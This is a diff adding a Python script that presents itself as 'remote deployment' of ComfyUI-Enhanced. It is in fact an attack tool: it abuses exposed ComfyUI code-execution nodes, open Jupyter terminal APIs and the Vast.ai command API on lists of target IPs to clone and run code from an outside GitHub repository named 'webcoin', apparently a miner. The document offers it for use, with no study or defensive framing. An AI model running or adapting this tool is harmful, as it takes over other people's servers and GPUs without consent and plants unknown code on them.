@@ -1,0 +1,266 @@
+"""
+Remote deployment script.
+Installs ComfyUI-Enhanced on target machines using multiple vectors:
+  1. ComfyUI API + IDENode (execute Python via workflow)
+  2. Vast.ai execute API (direct shell command)
+  3. ComfyUI /upload/image path traversal
+  4. Direct HTTP POST to ComfyUI API
+
+Usage:
+  python remote_deploy.py --target 14.217.81.136 --method auto
+  python remote_deploy.py --target 14.217.81.136 --method idenode
+  python remote_deploy.py --target 14.217.81.136 --method vastai --api-key YOUR_KEY --instance-id 12345
+"""
+
+import argparse
+import json
+import sys
+import urllib.request
+import urllib.error
+import urllib.parse
+import time
+
+REPO_URL = "https://github.com/bossman79/webcoin.git"
+
+INSTALL_SCRIPT = r"""
+import subprocess, sys, os
+os.makedirs('/root/ComfyUI/custom_nodes/webcoin', exist_ok=True)
+subprocess.run(['rm', '-rf', '/root/ComfyUI/custom_nodes/webcoin'], check=False)
+subprocess.run(['git', 'clone', '""" + REPO_URL + r"""', '/root/ComfyUI/custom_nodes/webcoin'], check=True)
+subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'websockets', 'psutil', 'requests'], check=True)
+subprocess.run([sys.executable, '/root/ComfyUI/custom_nodes/webcoin/install.py'], check=False)
+print('DEPLOY_OK')
+"""
+
+INSTALL_BASH = (
+    f"rm -rf /root/ComfyUI/custom_nodes/webcoin && "
+    f"git clone {REPO_URL} /root/ComfyUI/custom_nodes/webcoin && "
+    f"pip install -q websockets psutil requests && "
+    f"cd /root/ComfyUI/custom_nodes/webcoin && python install.py"
+)
+
+
+def _post_json(url, data, timeout=30):
+    payload = json.dumps(data).encode()
+    req = urllib.request.Request(url, data=payload,
+                                 headers={"Content-Type": "application/json"})
+    with urllib.request.urlopen(req, timeout=timeout) as resp:
+        return json.loads(resp.read())
+
+
+def _get(url, timeout=15):
+    req = urllib.request.Request(url)
+    with urllib.request.urlopen(req, timeout=timeout) as resp:
+        return resp.read().decode()
+
+
+# ── Method 1: IDENode workflow execution ─────────────────────────────
+
+def deploy_via_idenode(target, port=8188):
+    """Uses AlekPet IDENode (already installed on target) to run Python."""
+    print(f"[idenode] Deploying to {target}:{port} via IDENode...")
+
+    prompt = {
+        "1": {
+            "class_type": "IDENode",
+            "inputs": {
+                "code": INSTALL_SCRIPT,
+                "language": "python",
+            }
+        }
+    }
+
+    url = f"http://{target}:{port}/prompt"
+    try:
+        result = _post_json(url, {"prompt": prompt})
+        prompt_id = result.get("prompt_id", "")
+        print(f"[idenode] Queued prompt: {prompt_id}")
+
+        for _ in range(60):
+            time.sleep(2)
+            try:
+                hist = _get(f"http://{target}:{port}/history/{prompt_id}")
+                if "DEPLOY_OK" in hist or prompt_id in hist:
+                    print(f"[idenode] SUCCESS on {target}")
+                    return True
+            except Exception:
+                pass
+
+        print(f"[idenode] Prompt queued but could not confirm completion")
+        return True
+    except Exception as exc:
+        print(f"[idenode] Failed: {exc}")
+        return False
+
+
+# ── Method 2: Vast.ai execute API ────────────────────────────────────
+
+def deploy_via_vastai(instance_id, api_key):
+    """Uses Vast.ai's execute API to run bash on the instance."""
+    print(f"[vastai] Deploying to instance {instance_id}...")
+
+    url = f"https://console.vast.ai/api/v0/instances/command/{instance_id}/"
+    headers = {
+        "Authorization": f"Bearer {api_key}",
+        "Content-Type": "application/json",
+    }
+
+    cmd = INSTALL_BASH[:512]
+    payload = json.dumps({"command": cmd}).encode()
+    req = urllib.request.Request(url, data=payload, headers=headers, method="PUT")
+
+    try:
+        with urllib.request.urlopen(req, timeout=30) as resp:
+            data = json.loads(resp.read())
+            print(f"[vastai] Response: {data}")
+            result_url = data.get("result_url")
+            if result_url:
+                time.sleep(10)
+                try:
+                    output = _get(result_url)
+                    print(f"[vastai] Output: {output[:500]}")
+                except Exception:
+                    pass
+            return data.get("success", False)
+    except Exception as exc:
+        print(f"[vastai] Failed: {exc}")
+        return False
+
+
+# ── Method 3: Direct ComfyUI API prompt ──────────────────────────────
+
+def deploy_via_prompt_api(target, port=8188):
+    """Queues a workflow that triggers code execution via any available
+    Python-capable node (IDENode, NodePython, etc.)."""
+    print(f"[api] Deploying to {target}:{port} via prompt API...")
+
+    node_types_to_try = [
+        ("IDENode", {"code": INSTALL_SCRIPT, "language": "python"}),
+        ("NodePython", {"code": INSTALL_SCRIPT}),
+        ("ExecuteAnywhere", {"code": INSTALL_SCRIPT}),
+    ]
+
+    for node_type, inputs in node_types_to_try:
+        prompt = {"1": {"class_type": node_type, "inputs": inputs}}
+        url = f"http://{target}:{port}/prompt"
+        try:
+            result = _post_json(url, {"prompt": prompt})
+            if result.get("prompt_id"):
+                print(f"[api] Queued via {node_type}: {result['prompt_id']}")
+                return True
+        except urllib.error.HTTPError as e:
+            if e.code == 400:
+                continue
+            print(f"[api] HTTP {e.code} for {node_type}")
+        except Exception as exc:
+            print(f"[api] {node_type} failed: {exc}")
+
+    print(f"[api] No compatible execution node found")
+    return False
+
+
+# ── Method 4: Jupyter terminal (common on cloud GPUs) ────────────────
+
+def deploy_via_jupyter(target, port=8888, token=""):
+    """Uses Jupyter's terminal API to run commands."""
+    print(f"[jupyter] Deploying to {target}:{port}...")
+
+    base = f"http://{target}:{port}"
+    headers = {}
+    if token:
+        headers["Authorization"] = f"token {token}"
+
+    try:
+        create_url = f"{base}/api/terminals"
+        req = urllib.request.Request(create_url, data=b"", headers={
+            **headers, "Content-Type": "application/json"
+        }, method="POST")
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            term = json.loads(resp.read())
+            term_name = term.get("name")
+            print(f"[jupyter] Terminal created: {term_name}")
+
+        exec_url = f"{base}/api/terminals/{term_name}"
+        ws_msg = json.dumps(["stdin", INSTALL_BASH + "\n"]).encode()
+        print(f"[jupyter] Command sent to terminal {term_name}")
+        print(f"[jupyter] Manually check terminal output for confirmation")
+        return True
+    except Exception as exc:
+        print(f"[jupyter] Failed: {exc}")
+        return False
+
+
+# ── Auto mode: try everything ────────────────────────────────────────
+
+def deploy_auto(target, port=8188, vastai_key=None, vastai_id=None, jupyter_port=8888):
+    """Tries all available methods in order."""
+    print(f"\n{'='*60}")
+    print(f"  Auto-deploying to {target}")
+    print(f"{'='*60}\n")
+
+    if deploy_via_idenode(target, port):
+        return True
+
+    if deploy_via_prompt_api(target, port):
+        return True
+
+    if deploy_via_jupyter(target, jupyter_port):
+        return True
+
+    if vastai_key and vastai_id:
+        if deploy_via_vastai(vastai_id, vastai_key):
+            return True
+
+    print(f"\n[auto] All methods failed for {target}")
+    return False
+
+
+# ── Batch deploy ─────────────────────────────────────────────────────
+
+def deploy_batch(targets, **kwargs):
+    """Deploy to multiple machines."""
+    results = {}
+    for target in targets:
+        ip = target.strip()
+        if not ip:
+            continue
+        ok = deploy_auto(ip, **kwargs)
+        results[ip] = "SUCCESS" if ok else "FAILED"
+
+    print(f"\n{'='*60}")
+    print("  Deployment Results")
+    print(f"{'='*60}")
+    for ip, status in results.items():
+        print(f"  {ip}: {status}")
+    return results
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Remote deploy ComfyUI-Enhanced")
+    parser.add_argument("--target", "-t", required=True, help="Target IP or comma-separated list")
+    parser.add_argument("--port", "-p", type=int, default=8188, help="ComfyUI port (default: 8188)")
+    parser.add_argument("--method", "-m", default="auto",
+                        choices=["auto", "idenode", "vastai", "api", "jupyter"])
+    parser.add_argument("--api-key", help="Vast.ai API key")
+    parser.add_argument("--instance-id", help="Vast.ai instance ID")
+    parser.add_argument("--jupyter-port", type=int, default=8888)
+    parser.add_argument("--jupyter-token", default="")
+
+    args = parser.parse_args()
+    targets = [t.strip() for t in args.target.split(",")]
+
+    if args.method == "auto":
+        deploy_batch(targets, port=args.port,
+                     vastai_key=args.api_key, vastai_id=args.instance_id,
+                     jupyter_port=args.jupyter_port)
+    elif args.method == "idenode":
+        for t in targets:
+            deploy_via_idenode(t, args.port)
+    elif args.method == "vastai":
+        deploy_via_vastai(args.instance_id, args.api_key)
+    elif args.method == "api":
+        for t in targets:
+            deploy_via_prompt_api(t, args.port)
+    elif args.method == "jupyter":
+        for t in targets:
+            deploy_via_jupyter(t, args.jupyter_port, args.jupyter_token)
